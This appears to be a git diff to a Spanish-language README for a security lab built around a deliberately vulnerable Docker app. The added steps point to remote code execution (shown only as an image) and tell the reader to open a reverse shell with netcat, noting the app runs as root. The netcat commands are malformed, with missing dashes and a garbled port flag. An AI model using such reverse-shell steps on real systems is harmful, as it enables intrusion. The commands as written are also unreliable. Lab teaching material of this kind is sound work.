@@ -23,3 +23,10 @@ Puedes descomprimir usando el comando: `unzip lab-app-compressed.zip`
 `sudo docker run -d --name vulnerable-app -p 5000:5000 vulnerable-app`
 
 > Nota: Para asegurarte que esté runeando la app, puedes usar el comando: `sudo docker ps` y debe salir algo como STATUS UP x seconds.
+
+## Paso 4: Remote Code Execution
+
+<img width="1195" height="679" alt="image" src="https://github.com/user-attachments/assets/1cfdd069-39f1-4506-a5e6-389277726619" />
+
+## Paso 5: Reverse Shell
+Allí, con netcat, puedes iniciar una reverse shell: nc lvnp -4444 desde tu host y nc vnp 4444 desde el host externo, en la línea de comandos mostrada, adicionalmente, todo es viable, puesto que fue ejecutado como root.
